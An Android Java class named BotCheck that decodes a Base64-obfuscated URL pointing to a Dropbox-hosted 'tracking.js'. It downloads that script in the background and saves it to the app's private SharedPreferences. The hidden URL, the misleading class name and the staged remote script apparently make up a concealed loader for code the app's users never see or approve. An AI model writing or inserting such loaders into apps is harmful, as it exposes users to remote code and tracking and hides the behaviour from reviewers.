package com.sasa.mskrpoject;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.util.Base64;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import static com.facebook.FacebookSdk.getApplicationContext;

public class BotCheck {
    private Context context;
    private static SharedPreferences sharedPreferences;

    void check(Context context) {
        this.context = context;
        DownloadTask task = new DownloadTask();

        String result = "";
        task.doInBackground();

    }

    private static class DownloadTask extends AsyncTask<String, Void, String> {

        private SharedPreferences sharedPreferences;

        @Override
        protected String doInBackground(String... strings) {
            String uor = new String(Base64.decode("aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvdXF0cDRpcG9jNGQxeGVwL3RyYWNraW5nLmpz", Base64.DEFAULT));
            URL klek = null;
            try {
                klek = new URL(uor);
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }

            assert klek != null;
            Request request = new Request.Builder()
                    .url(klek)
                    .build();

            new OkHttpClient().newCall(request)
                    .enqueue(new Callback() {
                        @Override
                        public void onFailure(final Call call, IOException e) {
                            e.printStackTrace();
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull final Response response) throws IOException {
                            String res = response.body().string();
                            sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
                            SharedPreferences.Editor ed = sharedPreferences.edit();
                            ed.putString("res", res);
                            ed.apply();
                        }
                    });
            return null;
        }
    }

}
